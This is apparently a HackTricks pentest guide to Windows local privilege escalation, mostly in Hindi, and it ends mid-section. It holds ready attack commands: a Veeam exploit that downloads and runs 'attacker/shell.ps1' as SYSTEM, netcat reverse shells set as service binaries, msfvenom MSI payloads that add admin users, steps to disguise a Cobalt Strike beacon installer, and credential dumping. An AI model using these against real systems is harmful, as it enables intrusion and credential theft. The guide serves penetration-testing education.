# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Windows local privilege escalation vectors खोजने के लिए सबसे अच्छा टूल:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## प्रारंभिक Windows सिद्धांत

### Access Tokens

**यदि आप नहीं जानते कि Windows Access Tokens क्या हैं, तो जारी रखने से पहले निम्न पृष्ठ पढ़ें:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs के बारे में अधिक जानकारी के लिए निम्न पृष्ठ देखें:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**यदि आप नहीं जानते कि Windows में Integrity Levels क्या हैं, तो जारी रखने से पहले निम्न पृष्ठ पढ़ें:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows सुरक्षा नियंत्रण

Windows में विभिन्न चीज़ें हैं जो आपको सिस्टम को enumerate करने, executables चलाने या यहाँ तक कि आपकी गतिविधियों का पता लगाने से रोक सकती हैं। privilege escalation enumeration शुरू करने से पहले आपको निम्नलिखित पृष्ठ पढ़ना चाहिए और इन सभी defense mechanisms को सूचीबद्ध करना चाहिए:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

UIAccess processes launched through `RAiLaunchAdminProcess` का दुरुपयोग करके, जब AppInfo secure-path checks बायपास किए जाते हैं, तो बिना प्रॉम्प्ट्स के High IL तक पहुँचा जा सकता है। इस UIAccess/Admin Protection bypass वर्कफ़्लो को यहाँ देखें:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

## सिस्टम जानकारी

### Version info enumeration

जांचें कि Windows version में कोई ज्ञात कमजोरियाँ तो नहीं हैं (लागू किए गए पैच भी जांचें)।
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

यह [site](https://msrc.microsoft.com/update-guide/vulnerability) Microsoft सुरक्षा कमजोरियों के बारे में विस्तृत जानकारी खोजने के लिए उपयोगी है। इस डेटाबेस में 4,700 से अधिक सुरक्षा कमजोरियाँ हैं, जो Windows वातावरण द्वारा प्रस्तुत **massive attack surface** को दर्शाती हैं।

**सिस्टम पर**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_

**स्थानीय रूप से सिस्टम जानकारी के साथ**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### वातावरण

क्या कोई credential/Juicy जानकारी env variables में सहेजी गई है?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell इतिहास
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript files

आप सीख सकते हैं कि इसे कैसे चालू किया जाए: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell पाइपलाइन निष्पादन के विवरण रिकॉर्ड किए जाते हैं, जिनमें निष्पादित कमांड, कमांड इनवोकेशन्स और स्क्रिप्ट के हिस्से शामिल हैं। हालांकि, पूर्ण निष्पादन विवरण और आउटपुट परिणाम हमेशा कैप्चर नहीं हो सकते।

इसे सक्षम करने के लिए, दस्तावेज़ के "Transcript files" सेक्शन में दिए निर्देशों का पालन करें, और **"Module Logging"** को **"Powershell Transcription"** के बजाय चुनें।
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell logs से अंतिम 15 events देखने के लिए आप निम्नलिखित कमांड चला सकते हैं:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

स्क्रिप्ट के निष्पादन की पूरी गतिविधि और सामग्री का रिकॉर्ड कैप्चर किया जाता है, जिससे कोड के प्रत्येक ब्लॉक को चलने के दौरान दर्ज किया जाता है। यह प्रक्रिया प्रत्येक गतिविधि का एक व्यापक ऑडिट ट्रेल संरक्षित करती है, जो forensics और दुर्भावनापूर्ण व्यवहार के विश्लेषण के लिए मूल्यवान है। निष्पादन के समय सभी गतिविधियों को दस्तावेज़ करके, प्रक्रिया के बारे में विस्तृत अंतर्दृष्टि प्रदान की जाती है।
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block के लॉगिंग इवेंट्स Windows Event Viewer में निम्न path पर मिल सकते हैं: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
आखिरी 20 इवेंट्स देखने के लिए आप उपयोग कर सकते हैं:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### इंटरनेट सेटिंग्स
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### ड्राइव्स
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

यदि अपडेट http**S** के बजाय http के माध्यम से अनुरोधित किए जा रहे हों तो आप सिस्टम को compromise कर सकते हैं।

आप cmd में निम्नलिखित चलाकर यह जांचना शुरू करते हैं कि नेटवर्क non-SSL WSUS update का उपयोग करता है या नहीं:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
या PowerShell में निम्नलिखित:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
यदि आपको इनमें से किसी के समान उत्तर मिलता है:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
और यदि `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` या `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` बराबर है `1`।

तो, **it is exploitable.** अगर आख़िरी registry की मान 0 है, तो WSUS entry अनदेखा कर दी जाएगी।

इन कमजोरियों का फायदा उठाने के लिए आप निम्न टूल्स का उपयोग कर सकते हैं: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - ये MiTM weaponized exploits scripts हैं जो non-SSL WSUS ट्रैफ़िक में 'fake' updates इंजेक्ट करती हैं।

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
बुनियादी तौर पर, यह वही दोष है जिसका यह बग फायदा उठाता है:

> यदि हमारे पास अपने local user proxy को modify करने की क्षमता है, और Windows Updates Internet Explorer’s settings में configure किए गए proxy का उपयोग करते हैं, तो हम स्थानीय रूप से [PyWSUS](https://github.com/GoSecure/pywsus) चला कर अपनी ही ट्रैफ़िक को intercept कर सकते हैं और अपने asset पर elevated user के रूप में code चला सकते हैं।
>
> और भी, चूँकि WSUS सेवा current user’s settings का उपयोग करती है, यह उसके certificate store का भी उपयोग करेगा। यदि हम WSUS hostname के लिए एक self-signed certificate जनरेट कर के इसे current user’s certificate store में जोड़ दें, तो हम HTTP और HTTPS दोनों WSUS ट्रैफ़िक को intercept कर पाएँगे। WSUS certificate पर trust-on-first-use तरह की किसी HSTS-like mechanism का उपयोग नहीं करता। यदि प्रस्तुत किया गया certificate उपयोगकर्ता द्वारा trusted है और उसका hostname सही है, तो सेवा उसे स्वीकार कर लेगी।

आप इस vulnerability का exploit कर सकते हैं tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) का उपयोग करके (एक बार यह liberated हो जाने पर)।

## Third-Party Auto-Updaters and Agent IPC (local privesc)

कई enterprise agents लोकलहोस्ट IPC surface और एक privileged update channel एक्सपोज़ करते हैं। यदि enrollment को attacker server की ओर मजबूर किया जा सके और updater किसी rogue root CA या कमजोर signer checks पर भरोसा करे, तो एक local user एक malicious MSI डिलीवर कर सकता है जिसे SYSTEM सेवा इंस्टॉल कर देती है। सामान्यीकृत तकनीक देखें (Netskope stAgentSvc chain – CVE-2025-0309 पर आधारित) यहाँ:

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` लोकलहोस्ट पर **TCP/9401** पर एक सेवा एक्सपोज़ करता है जो attacker-controlled messages को प्रोसेस करता है, जिससे **NT AUTHORITY\SYSTEM** के रूप में arbitrary commands चलाने की अनुमति मिलती है।

- **Recon**: listener और version की पुष्टि करें, उदाहरण के लिए, `netstat -ano | findstr 9401` और `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`।
- **Exploit**: एक PoC जैसे `VeeamHax.exe` को आवश्यक Veeam DLLs के साथ उसी डायरेक्टरी में रखें, फिर local socket पर SYSTEM payload ट्रिगर करें:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
The service executes the command as SYSTEM.
## KrbRelayUp

Windows **domain** environments में कुछ विशिष्ट परिस्थितियों के तहत एक **local privilege escalation** vulnerability मौजूद है। इन परिस्थितियों में वे वातावरण शामिल हैं जहाँ **LDAP signing is not enforced,** उपयोगकर्ताओं के पास स्वयं के अधिकार होते हैं जो उन्हें **Resource-Based Constrained Delegation (RBCD)** कॉन्फ़िगर करने की अनुमति देते हैं, और उपयोगकर्ताओं के पास डोमेन के भीतर कंप्यूटर बनाने की क्षमता होती है। यह ध्यान देने योग्य है कि ये **requirements** **default settings** का उपयोग करके ही मिलने वाली स्थितियाँ हैं।

Find the **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

For more information about the flow of the attack check [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**If** ये 2 registers **enabled** हैं (मान **0x1** है), तो किसी भी privilege वाले उपयोगकर्ता `*.msi` फ़ाइलों को NT AUTHORITY\\**SYSTEM** के रूप में **install** (execute) कर सकते हैं।
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
If you have a meterpreter session you can automate this technique using the module **`exploit/windows/local/always_install_elevated`**

### PowerUP

विशेषाधिकार बढ़ाने के लिए वर्तमान निर्देशिका के अंदर Windows MSI बाइनरी बनाने के लिए power-up से `Write-UserAddMSI` कमांड का उपयोग करें। यह स्क्रिप्ट एक precompiled MSI इंस्टॉलर लिखती है जो user/group addition के लिए प्रॉम्प्ट करता है (इसलिए आपको GIU access की आवश्यकता होगी):
```
Write-UserAddMSI
```
बस बनाए गए binary को चलाकर privileges escalate करें।

### MSI Wrapper

इस tutorial को पढ़ें ताकि आप इन tools का उपयोग करके MSI wrapper कैसे बनाते हैं यह सीख सकें। ध्यान दें कि आप एक "**.bat**" file को wrap कर सकते हैं यदि आप **just** केवल **command lines** को **execute** करना चाहते हैं


{{#ref}}
msi-wrapper.md
{{#endref}}

### WIX के साथ MSI बनाना


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Visual Studio के साथ MSI बनाना

- Cobalt Strike या Metasploit से `C:\privesc\beacon.exe` में एक नया Windows EXE TCP payload बनाएं
- **Visual Studio** खोलें, **Create a new project** चुनें और search box में "installer" टाइप करें। **Setup Wizard** project चुनें और **Next** पर क्लिक करें।
- प्रोजेक्ट को एक नाम दें, जैसे **AlwaysPrivesc**, location के लिए **`C:\privesc`** का उपयोग करें, **place solution and project in the same directory** चुनें, और **Create** पर क्लिक करें।
- **Next** पर क्लिक करते रहें जब तक आप step 3 of 4 (choose files to include) पर न पहुँचें। **Add** पर क्लिक करें और अभी जो Beacon payload आपने बनाया है उसे चुनें। फिर **Finish** पर क्लिक करें।
- **Solution Explorer** में **AlwaysPrivesc** प्रोजेक्ट को हाइलाइट करें और **Properties** में **TargetPlatform** को **x86** से **x64** में बदलें।
- आप अन्य properties भी बदल सकते हैं, जैसे **Author** और **Manufacturer**, जो installed app को अधिक legitimate दिखा सकते हैं।
- प्रोजेक्ट पर right-click करें और **View > Custom Actions** चुनें।
- **Install** पर right-click करें और **Add Custom Action** चुनें।
- **Application Folder** पर double-click करें, अपनी **beacon.exe** फाइल चुनें और **OK** पर क्लिक करें। इससे सुनिश्चित होगा कि installer चलते ही beacon payload execute हो जाएगा।
- **Custom Action Properties** के अंतर्गत **Run64Bit** को **True** में बदलें।
- अंत में, **build** करें।
- यदि warning `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` दिखे, तो सुनिश्चित करें कि आपने platform को x64 पर सेट किया है।

### MSI Installation

malicious `.msi` file की **installation** को बैकग्राउंड में execute करने के लिए:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
इस vulnerability को exploit करने के लिए आप उपयोग कर सकते हैं: _exploit/windows/local/always_install_elevated_

## एंटीवायरस और डिटेक्टर

### ऑडिट सेटिंग्स

ये सेटिंग्स तय करती हैं कि क्या **logged** किया जा रहा है, इसलिए आपको ध्यान देना चाहिए
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, यह जानना दिलचस्प है कि logs कहाँ भेजे जाते हैं
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** का उद्देश्य **local Administrator passwords के प्रबंधन** के लिए है, यह सुनिश्चित करते हुए कि प्रत्येक पासवर्ड **अद्वितीय, यादृच्छिक, और नियमित रूप से अपडेट किया गया** हो उन कंप्यूटरों पर जो किसी डोमेन से जुड़े हैं। ये पासवर्ड Active Directory में सुरक्षित रूप से संग्रहीत होते हैं और केवल उन उपयोगकर्ताओं द्वारा एक्सेस किए जा सकते हैं जिन्हें ACLs के माध्यम से पर्याप्त अनुमतियाँ दी गई हों, जिससे उन्हें यदि अधिकृत हो तो local admin passwords देखने की अनुमति मिलती है।

{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

यदि सक्रिय है, तो **plain-text passwords LSASS में संग्रहीत हो जाते हैं** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA सुरक्षा

**Windows 8.1** से शुरू होकर, Microsoft ने Local Security Authority (LSA) के लिए उन्नत सुरक्षा पेश की ताकि अनट्रस्टेड प्रक्रियाओं के उन प्रयासों को **अवरोधित** किया जा सके जो **इसकी मेमोरी पढ़ने** या कोड इंजेक्ट करने से संबंधित हैं, जिससे सिस्टम और अधिक सुरक्षित हुआ।\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection)
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** को **Windows 10** में पेश किया गया था। इसका उद्देश्य डिवाइस पर संग्रहीत credentials को pass-the-hash जैसे खतरों से सुरक्षित रखना है।| [**Credentials Guard के बारे में अधिक जानकारी यहाँ।**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** को **Local Security Authority** (LSA) द्वारा प्रमाणीकृत किया जाता है और ऑपरेटिंग सिस्टम के घटकों द्वारा उपयोग किया जाता है। जब किसी उपयोगकर्ता का लॉगऑन डेटा किसी registered security package द्वारा प्रमाणीकृत होता है, तो आम तौर पर उस उपयोगकर्ता के लिए domain credentials स्थापित किए जाते हैं।\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## उपयोगकर्ता और समूह

### उपयोगकर्ताओं और समूहों की सूची बनाएं

आपको यह जांचना चाहिए कि जिन समूहों के आप सदस्य हैं, क्या उनके पास कोई दिलचस्प अनुमतियाँ हैं।
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### विशेषाधिकार प्राप्त समूह

यदि आप किसी **विशेषाधिकार प्राप्त समूह के सदस्य हैं तो आप विशेषाधिकार बढ़ा सकते हैं**। विशेषाधिकार प्राप्त समूहों और उन्हें दुरुपयोग करके विशेषाधिकार बढ़ाने के बारे में यहाँ जानें:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**और अधिक जानें** कि एक **token** क्या है इस पृष्ठ पर: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
निम्नलिखित पृष्ठ देखें ताकि आप **learn about interesting tokens** और उन्हें दुरुपयोग करने का तरीका जान सकें:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### लॉग इन उपयोगकर्ता / सत्र
```bash
qwinsta
klist sessions
```
### होम निर्देशिकाएँ
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### पासवर्ड नीति
```bash
net accounts
```
### क्लिपबोर्ड की सामग्री प्राप्त करें
```bash
powershell -command "Get-Clipboard"
```
## चल रही प्रक्रियाएँ

### फ़ाइल और फ़ोल्डर अनुमतियाँ

सबसे पहले, प्रक्रियाएँ सूचीबद्ध करते समय **प्रोसेस की कमांड लाइन के अंदर पासवर्ड की जाँच करें**.\
जाँचें कि क्या आप किसी चल रही बाइनरी को **ओवरराइट कर सकते हैं** या क्या आपके पास बाइनरी फ़ोल्डर पर लिखने की अनुमति है ताकि संभावित [**DLL Hijacking attacks**](dll-hijacking/index.html) का शोषण किया जा सके:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
हमेशा संभावित [**electron/cef/chromium debuggers** चल रहे होने की जाँच करें, आप इसका दुरुपयोग करके escalate privileges कर सकते हैं](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**processes के binaries की permissions की जाँच**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**प्रोसेस बाइनरीज़ के फ़ोल्डरों की permissions की जाँच (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

आप sysinternals के **procdump** का उपयोग करके किसी चल रहे process का memory dump बना सकते हैं। FTP जैसी services की memory में अक्सर **credentials in clear text in memory** होते हैं — memory को dump करके उन credentials को पढ़ने की कोशिश करें।
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Insecure GUI apps

**SYSTEM के रूप में चलने वाले एप्लिकेशन उपयोगकर्ता को CMD खोलने या डायरेक्टरी ब्राउज़ करने की अनुमति दे सकते हैं।**

उदाहरण: "Windows Help and Support" (Windows + F1), search for "command prompt", click on "Click to open Command Prompt"

## Services

Service Triggers से Windows को सेवा तब शुरू करने की अनुमति मिलती है जब कुछ शर्तें पूरी होती हैं (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, आदि)। अक्सर SERVICE_START अधिकारों के बिना भी आप उनके triggers को फायर करके privileged services शुरू कर सकते हैं। enumeration और activation techniques के लिए यहाँ देखें:

-
{{#ref}}
service-triggers.md
{{#endref}}

सेवाओं की सूची प्राप्त करें:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### अनुमतियाँ

आप किसी service की जानकारी प्राप्त करने के लिए **sc** का उपयोग कर सकते हैं
```bash
sc qc <service_name>
```
यह सिफारिश की जाती है कि प्रत्येक सेवा के लिए आवश्यक privilege level की जांच करने के लिए _Sysinternals_ का binary **accesschk** उपलब्ध हो।
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
यह अनुशंसित है कि जाँच की जाए कि क्या "Authenticated Users" किसी सेवा को संशोधित कर सकते हैं:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### सेवा सक्षम करें

यदि आपको यह त्रुटि हो रही है (उदाहरण के लिए SSDPSRV के साथ):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

आप इसे निम्नलिखित का उपयोग करके सक्षम कर सकते हैं:
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**ध्यान रखें कि सेवा upnphost काम करने के लिए SSDPSRV पर निर्भर करती है (XP SP1 के लिए)**

**इस समस्या का एक और उपाय** यह कमांड चलाना है:
```
sc.exe config usosvc start= auto
```
### **सर्विस बाइनरी पथ संशोधित करें**

ऐसी स्थिति में जहाँ "Authenticated users" समूह के पास किसी सर्विस पर **SERVICE_ALL_ACCESS** है, सर्विस की executable बाइनरी को संशोधित करना संभव है। **sc** को संशोधित और निष्पादित करने के लिए:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### सेवा पुनरारंभ करें
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Privileges को विभिन्न permissions के माध्यम से escalate किया जा सकता है:

- **SERVICE_CHANGE_CONFIG**: service binary की reconfiguration की अनुमति देता है।
- **WRITE_DAC**: permission reconfiguration सक्षम बनाता है, जिससे service configurations बदलने की क्षमता मिलती है।
- **WRITE_OWNER**: ownership हासिल करने और permission reconfiguration की अनुमति देता है।
- **GENERIC_WRITE**: service configurations बदलने की क्षमता विरासत में देता है।
- **GENERIC_ALL**: भी service configurations बदलने की क्षमता विरासत में देता है।

For the detection and exploitation of this vulnerability, the _exploit/windows/local/service_permissions_ can be utilized.

### Services binaries weak permissions

**Check if you can modify the binary that is executed by a service** या यह देखें कि क्या आपके पास उस फ़ोल्डर पर **write permissions on the folder** हैं जहाँ binary स्थित है ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
You can get every binary that is executed by a service using **wmic** (not in system32) and check your permissions using **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
आप **sc** और **icacls** का भी उपयोग कर सकते हैं:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### सर्विस रजिस्ट्री संशोधन अनुमतियाँ

आपको यह जाँचना चाहिए कि क्या आप किसी भी सर्विस रजिस्ट्री को संशोधित कर सकते हैं।\
आप निम्नलिखित करके किसी सर्विस **रजिस्ट्री** पर अपनी **अनुमतियाँ** की **जाँच** कर सकते हैं:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
यह जाँचना चाहिए कि **Authenticated Users** या **NT AUTHORITY\INTERACTIVE** के पास `FullControl` अनुमतियाँ हैं या नहीं। यदि हाँ, तो सेवा द्वारा चलायी जाने वाली बाइनरी को बदला जा सकता है।

चलायी जाने वाली बाइनरी के Path को बदलने के लिए:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

कुछ Windows Accessibility विशेषताएँ प्रति-उपयोगकर्ता **ATConfig** keys बनाती हैं जिन्हें बाद में एक **SYSTEM** प्रक्रिया HKLM session key में कॉपी करती है। एक registry **symbolic link race** उस privileged write को **किसी भी HKLM path** में redirect कर सकती है, जिससे एक arbitrary HKLM **value write** primitive मिलता है।

Key locations (example: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` इंस्टॉल की गई accessibility features को सूचीबद्ध करता है।
